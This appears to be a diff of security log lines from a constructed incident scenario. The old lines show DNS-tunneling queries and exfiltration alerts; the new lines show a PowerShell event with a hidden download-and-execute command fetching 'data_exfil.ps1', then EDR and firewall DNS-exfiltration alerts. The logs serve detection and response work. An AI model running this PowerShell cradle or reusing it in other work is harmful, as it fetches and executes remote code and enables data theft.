@@ -1,6 +1,3 @@
-[2026-03-22 10:15:01] DNS QUERY: WKS-RES-042 -> 8.8.8.8 [TXT] aGVsbG8td29ybGQ=.tunnel.research-sync-service.top
-[2026-03-22 10:15:05] DNS QUERY: WKS-RES-042 -> 8.8.8.8 [TXT] dGhpcy1pcy1hLXRlc3Q=.tunnel.research-sync-service.top
-[2026-03-22 10:15:10] DNS QUERY: WKS-RES-042 -> 8.8.8.8 [TXT] d2UtaGF2ZS1hLWxlYWs=.tunnel.research-sync-service.top
-...
-[2026-03-22 12:30:15] MONITOR: Excessive DNS TXT volume detected. 1.2GB egressed in 120min.
-[2026-03-22 12:30:20] ALERT: [CRITICAL] Data Exfiltration via DNS Tunneling suspected.
+2026-03-26T10:30:15Z CEF:0|Microsoft|PowerShell|10.0|4104|ScriptBlockLogging|7|suser=admin.kramer cs1="powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://mediareleaseupdates.com/data_exfil.ps1')"
+2026-03-26T10:34:22Z CEF:0|CrowdStrike|Falcon|1.0|NetworkConnect|High-Volume DNS Exfiltration|9|src=10.0.1.42 dst=166.88.2.90 dpt=53 proto=UDP cs1="TXT" cs2="mediareleaseupdates.com"
+2026-03-26T10:34:30Z CEF:0|Palo Alto|Firewall|1.0|THREAT|DNS Exfiltration Detected|9|src=10.0.1.42 dst=166.88.2.90 dpt=53 proto=UDP cs1="mediareleaseupdates.com"
